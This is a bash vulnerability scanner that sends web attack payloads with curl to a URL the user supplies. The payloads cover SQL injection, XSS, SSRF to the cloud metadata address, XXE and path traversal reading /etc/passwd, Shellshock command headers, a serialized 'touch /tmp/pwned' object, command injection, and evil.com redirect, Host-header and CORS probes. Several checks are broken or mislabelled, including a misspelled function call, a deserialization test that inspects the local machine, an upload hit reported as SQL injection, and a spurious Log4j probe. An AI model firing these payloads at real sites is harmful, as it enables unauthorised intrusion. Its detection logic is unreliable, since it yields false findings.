#!/bin/bash

# Color Definitions
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
MAGENTA="${C}[1;35m"
CYAN="${C}[1;36m"
LIGHT_GRAY="${C}[1;37m"
DARK_GRAY="${C}[1;90m"
NC="${C}[0m" # No Color
UNDERLINED="${C}[4m"
ITALIC="${C}[3m"
PARPADEO="${C}[1;5m"

# Report time mark
date=$(date +'%d_%m_%Y_%H%M%S')
report="report_$date.txt"
line=$(printf "%0.s-" {1..50})

write_report() {
        local message=$1
        echo -e "$message" >> $report
}

usage() {
	echo -e "${GREEN}Usage: $0 -u <url>${NC}"
	echo "${GREEN}Options"
	echo "  -u    URL to test vulns"
	echo "  -h    Help message"
	exit 1
}

while getopts "u:h" opt; do
	case ${opt} in
		u) url="$OPTARG" ;;
		h) usage ;;
		*) usage ;;
	esac
done

if [[ -z "$url" ]]; then
	usage
fi

vuln_web() {
	common_endpoints=("index.php" "login.php" "search.php" "product.php" "user.php" "admin.php")
	common_parameters=("id" "user" "product" "category" "page")
	sqli_payloads=("'" "\" OR 1=1 --" "' OR 'a'='a" "' OR 1=1#" "' UNION SELECT NULL--" "' OR '1'='1' --" "--" "' OR '1'='1'#" "' OR 'a'='a'--")

	regex='^((https?|ftp):\/\/)?([a-zA-Z0-9.-]+)(:[0-9]{1,5})?(\/.*)?$'
        if [[ "$url" =~ $regex ]]; then
                all="${BASH_REMATCH[0]}"
                prefix="${BASH_REMATCH[1]}"
                domain="${BASH_REMATCH[2]}"
                port="${BASH_REMATCH[3]}"
                rest="${BASH_REMATCH[4]}"
        else
                echo "[${RED}ERROR${NC}]This url is not valid"
                exit 2

        fi
        #Check XSS vulnerability
        response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d "<script>alert('XSS Vulnerability');</script" "$url")
        if [[ $response == *"<script>alert('XSS Vulnerability');</script"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to XSS"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to XSS"
        fi
        #Check SSRF (Server-Side Request Forgery)
        response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
        if [[ $response == *"169.254.169.254"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to SSRF"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to SSRF"
        fi
        #Check XXE (XML External Entity)
        response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$url")
        if [[ $response == *"root:x"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to XXE"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to XXE"
        fi
        #Check insecure deserialization vulnerability
        response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
        if [[ -f "/tmp/pwned" ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to deserialization"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to deserialization"
        fi
        #Check Shellshock vulnerability (RCE)
        response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'" "$url")
        if [[ $response == *"vulnerable"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to shellshock"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to RCE shellshock"
        fi
        response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo SHELLSHOCK_RCE_DEMO'" "$url")
        if [[ $response == *"SHELLSHOCK_RCE_DEMO"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to shellshock"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to Shellsohck"
        fi
        #Check remote code execution (RCE)
        response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
        if [[ $response == *"vulnerable"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to RCE"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to RCE"
        fi

        #Check CSRF vulnerability (Cross-Site Request Forgery)
        response=$(curl -s -X POST -d 'token=test' "$url")
        if [[ $response == *"token=test"*  ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to CSRF"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to CSRF"
        fi
        #Check LFI vulnerability (Local FIle Inclusion)
        response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
        if [[ $response == *"root:"* ]]; then
                wirte_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to LFI"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to LFI"
        fi

        #Check open redirect vulnerability
        response=$(curl -s -L "$url?redirect=http://google.com")
        if [[ $response == *"<title>Google</title>"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to Open Redirect"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to open redirect"
        fi
        #Check Log4J vulnerability
        response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
        if [[ $response == *"log4j"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] Thir url looks vulnerable to Log4j"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to Log4J"
        fi

        #Prueba de vulnerabilidad RFI (Remote File Inclusion)
        response=$(curl -s "$url?file=http://google.com")
        if [[ $response == *"<title>Google</title>"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to RFI"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to RFI"
        fi


        #Check transversal path vulnerability
        response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
        if [[ $response == *"root:"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to transversal path"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to transversal path"
        fi
        #Check SQL injection
	thechecker=0
	for endpoint in "${common_endpoints[@]}"; do
    		for parameter in "${common_parameters[@]}"; do
        		for payload in "${sqli_payloads[@]}"; do
		            full_url="${url}/${endpoint}?${parameter}=1${payload}"

		            response=$(curl -s "$full_url")

		            if [[ $response == *"SQL syntax"* || $response == *"MySQL"* || $response == *"Warning"* ]]; then
                		write_report "[${BLUE}VULNERABLE${NC}] Possible SQL Injection at ${full_url} with payload '${payload}'"
                		thechecker+=1
            		    fi
        		done
    		done
	done


	if [[ "$thechecker" == 0 ]]; then
		echo "[${RED}INFO${NC}]This url is not vulnerable to sql injection"
	fi
        #Check file upload vulnerability
        response=$(curl -s -F "file=@/etc/passwd" "$url/upload")
        if [[ $response == *"root:x"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to SQL Injection"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to file upload"
        fi
        #Check command injeciton
        response=$(curl -s -d "cmd=whoami" "$url/cmd")
        if [[ $response == *"root"* || $response == *"www-data"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to command injection"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to command injection"
        fi

        #Check host header injection
        response=$(curl -s -H 'Host: evil.com' "$url")
        if [[ $response == *"evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to header injection"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to header injection"
        fi

        #Check url redirection
        response=$(curl -s -L "$url?next=http://evil.com")
        if [[ $response == *"evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to URL redirection"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to url redirection"
        fi

        #Check http parameter pollution vulnerability (HPP)
        response=$(curl -s "$url?page=1&page=2")
        if [[ $response == *"page=2"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to HPP"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to HPP"
        fi
        #Check clickjacking
        response=$(curl -s -I "$url")
        if [[ $response != *"X-Frame-Options: DENY"* && $response != *"X-Frame-Options: SAMEORIGIN"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to Clickjacking"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to clickjacking"
        fi
        #Check bad conf, CORS (Cross-Origin Resource Sharing)
        response=$(curl -s -H "Origin: http://evil.com" -I "$url")
        if [[ $response == *"Access-Control-Allow-Origin: http://evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to CORS"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to CORS"
        fi
        #Check sensitive data
        response=$(curl -s "$url")
        if [[ $response == *"API_KEY"* || $response == *"password"* || $response == *"api"* || $response == *"uri"* || $response == *"login"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to sensitive data"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to sensitive data"
        fi


        #Check Session fixation
        response=$(curl -s -I "$url")
        if [[ $response == *"Set-Cookie: sessionid="* || $response == *"csrftoken="* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to session fixation"
        else
                echo "[${RED}INFO${NC}]This url is not vulnerable to session fixation"
        fi







}

vuln_web
